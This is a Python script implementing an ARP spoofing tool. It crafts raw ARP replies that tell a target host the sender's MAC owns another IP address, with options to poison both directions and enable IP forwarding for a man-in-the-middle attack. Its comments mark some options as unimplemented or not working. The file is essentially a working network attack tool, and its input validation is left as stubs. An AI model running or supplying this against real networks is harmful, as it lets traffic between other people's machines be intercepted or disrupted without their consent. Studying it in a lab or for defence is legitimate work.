#!/usr/bin/env python3

# usage: arpspoof.py -t target -i ip [-r rate] [-m mac] [-b] [-f] [-c]
#
# example: ./arpspoof.py -t 192.168.10.1 -i 192.168.10.2
# 
#   tell 192.168.10.1 that our ip address is 192.168.10.2
#   tell 192.168.10.1 that our ip address is 192.168.10.2
#   ...
# 
# OPTIONS
#
#   -h, --help
#       Display this dialogue
#
#   -t, --tell <target>
#       Send this IP address the ARP spoof
#
#   -i, --ip <impersonated-ip>
#       This is the IP we are impersonating
#
#   UNIMPLEMENTED
#   -m, --mac <impersonating-mac>
#       This is the MAC address to send in the request
#       If it isn't specified, we use our MAC address
#
#   -r, --rate <milliseconds>
#       The rate in milliseconds between sending packets
#
#   Implemented, but overall test isn't working
#   -b, --both-ways
#       In addition to the normal ARP spoof sent, a
#       packet will also be sent to the IP we are
#       impersonating in order to assume the identity
#       of the other IP.
#
#   -f, --forward-ip
#       Whether or not this program should modify the
#       system configuration to forward ips
#
#   UNIMPLEMENTED
#   -c, --cleanup
#       On exit, send correct ARP packets
#
#   Not implemented, using combined -f and -b flags does not give desired result
#   --man-in-the-middle
#       Equivalent to using -b, -f, and -c

import re
import time
import socket
import argparse
import subprocess
from struct import pack

# Here are a few commands that allow you to run a system command
# It isn't actually 'bash' per se, but you are running a shell
# The 'bash' command just gives stdout, don't use it if you want stderr
# Depending on the command used, the [:-1] may not actually be preferable
run_process = lambda cmd: subprocess.run(cmd, stdout = subprocess.PIPE, shell = True)
bash = lambda cmd: run_process(cmd).stdout.decode('utf-8')[:-1]

parser = argparse.ArgumentParser(
    # TODO: Add more of a description. Note: we may also use epilogue and prologue.
    description = 'ARP spoofer',
    formatter_class = lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=0)
)

parser._action_groups.pop()
required = parser.add_argument_group('required arguments')
optional = parser.add_argument_group('optional arguments')

t_help='''
       Send this IP address the ARP spoof

'''

i_help='''
       This is the IP we are impersonating

'''

r_help='''
       The rate in milliseconds to send ARP packets.

'''

m_help='''
       This is the MAC address to send in the request
       If it isn't specified, we use our MAC address

'''

b_help='''
       In addition to the normal ARP spoof sent, a
       packet will also be sent to the IP we are
       impersonating in order to assume the identity
       of the other IP. This allows for us to make
       a MITM attack, assumping ip forwarding is enabled.

'''

f_help='''
       Whether or not this program should modify the
       system configuration to forward ips.

'''

# TODO: Validate the IP address and MAC address (we did this before)
def parse_ip(ip):
    return ip

def parse_mac(mac):
    return mac

# Linux-only solution
# Tested on Kali linux, note this may not necessarily work on other linux platforms
def get_mac():
    mac = bash('cat /sys/class/net/eth0/address')
    return mac

# This can only find the address if it already exists in the table. It does
# not send an arp request if the ip is not known, rather it returns `None`.
def resolve_addr(lookup_ip):
    table = bash('cat /proc/net/arp | tail --lines=+2')
    for entry in table.splitlines():
        
        # The primary information we need is the ip and and the mac address
        # The other elements might matter, but generally we should be able
        # to assume that the hw_type and device always stay the same. I'm
        # not sure about the other elements really.
        # [ ip, hw_type, flags, hw_addr, mask, device ]
        # ['192.168.10.2', '0x1', '0x2', '00:50:56:f6:c7:3a', '*', 'eth0']
        
        ip, _, _, hw_addr, _, _ = entry.split()
        if ip == lookup_ip:
            return hw_addr

# Constructs an ARP packet with a few parameters. The default behavior is to
# spoof with the ip given in the arguments. If 'ask' is used we use OP code
# '1' instead of '2' and if 'broadcast' is true we use ff:ff:ff:ff:ff:ff and
# 00:00:00:00:00:00 instead of the target mac.
def build_packet(args, swap_target=False, actual=False, ask=False, broadcast=False):
    
    hex = lambda x: int(x, 16)
    format_ip = lambda ip: bytes(map(int, ip.split('.')))
    format_mac = lambda mac: bytes(map(hex, mac.split(':')))
    
    # This remains true no matter what args we have
    # No matter what packet we send, we always want it to route back to us
    our_mac = format_mac(get_mac())
    
    #if actual: # for cleanup
        #our_mac = format_mac(resolve_addr(args.ip))
    
    # Select IP addresses to use
    if swap_target:
        target_ip = format_ip(args.ip)
        spoofed_ip = format_ip(args.target)
    else:
        target_ip = format_ip(args.target)
        spoofed_ip = format_ip(args.ip)
    
    # Select MAC addresses to use
    if broadcast:
        eth_target_mac = format_mac("ff:ff:ff:ff:ff:ff")
        target_mac = format_mac("00:00:00:00:00:00")
    else:
        real_target_mac = args.second_mac if swap_target else args.target_mac
        target_mac = format_mac(real_target_mac)
        eth_target_mac = target_mac
    
    # Operation: 1 = request, 2 = reply
    OP = 0x0001 if ask else 0x0002
    
    arp_packet = [
        eth_target_mac, our_mac, # Ethernet protcol requires MAC addresses for link layer
        pack('!H', 0x0806),  # Ethtype = ARP
        pack('!H', 0x0001),  # HRD (constant?)
        pack('!H', 0x0800),  # Protocol = Ipv4
        pack('!B', 0x06),    # Hardware Size 
        pack('!B', 0x04),    # Protocol Size
        pack('!H', OP),      # OP
        
        # Here we lie and say that our mac address is the resolution of the router IP
        our_mac, spoofed_ip, target_mac, target_ip
    ]
    
    return b''.join(arp_packet)

def send_packet(args):
    # Should we make the interface an argument?
    # Why are we using htons(3) again?
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    s.bind(("eth0", 0))
    
    # Add an `args.verbose` option?
    print('tell %s that our ip address is %s' % (args.target, args.ip))
    if args.both:
        print('tell %s that our ip address is %s' % (args.ip, args.target))
    
    s.send(build_packet(args))
    if args.both:
        s.send(build_packet(args, swap_target=True))
    
    s.close()

def arp_ask(args):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    s.bind(("eth0", 0))
    
    # We can wait however many seconds, but it isn't a reliable method. Once an
    # address is recieved it may also dissappear, so we should keep it in memory.
    # In this case, sniffing is probably preferable but for now we will use
    # the result of the arp table from the system.
    #packets = psocket.get_promiscuous_socket()
    #ethernet_data, _ = _packets.recvfrom(65536)

    invalid = lambda mac: mac == None or mac == "00:00:00:00:00:00"
    
    wait = 1
    mac1, mac2 = resolve_addr(args.target), resolve_addr(args.ip) 
    
    while invalid(mac1) or (invalid(mac2) and (args.both)):
        
        # Note: By doing a broadcast we can't cleanup with non-targeted devices easily.
        # We may be able to broadcast the cleanup information though.
        s.send(build_packet(args, broadcast=True, ask=True))
        
        # This doesn't actually work because the mac address required to
        # be in the body is what we are actually requesting.
        #s.send(build_packet(args, ask=True))
        
        time.sleep(wait)
        wait *= 2
        if wait >= 16: wait = 1
        
        mac1 = resolve_addr(args.target) if invalid(mac1) else mac1
        mac2 = resolve_addr(args.ip) if invalid(mac2) else mac2
   
    s.close()
    return mac1, mac2

# TODO: Remove or implement args.mac, args.verbose, etc
def main(args):
    
    print("Resolving the IPs. This could take some time if they aren't in the cache already.")
    m1, m2 = arp_ask(args)
    args.target_mac = m1
    args.second_mac = m2
    
    print("mac of %s is %s" % (args.target, m1))
    print("mac of %s is %s" % (args.ip, m2))
    
    if args.fwd:
        print("Using ip forwarding")
        bash('sysctl net.ipv4.ip_forward=1')
    else:
        print("Not using ip forwarding")
        bash('sysctl net.ipv4.ip_forward=0')
    
    while True:
        send_packet(args)
        time.sleep(args.rate / 1000)

if __name__ == "__main__":
    
    required.add_argument('-t', '--tell', dest='target', metavar='target',
        type=parse_ip, help=t_help, required=True)
    
    required.add_argument('-i', '--ip', dest='ip', metavar='ip',
        type=parse_ip, help=i_help, required=True)

    optional.add_argument('-r', '--rate', dest='rate', metavar='rate',
        type=int, default=1000, help=r_help)
    
    optional.add_argument('-m', '--mac', dest='mac', metavar='mac',
        type=parse_mac, help=m_help)
    
    optional.add_argument('-b', '--both-ways', dest='both',
        action='store_true', help=b_help)

    optional.add_argument('-f', '--forward-ip', dest='fwd',
        action='store_true', help=f_help)
    
    args = parser.parse_args()
    
    main(args)

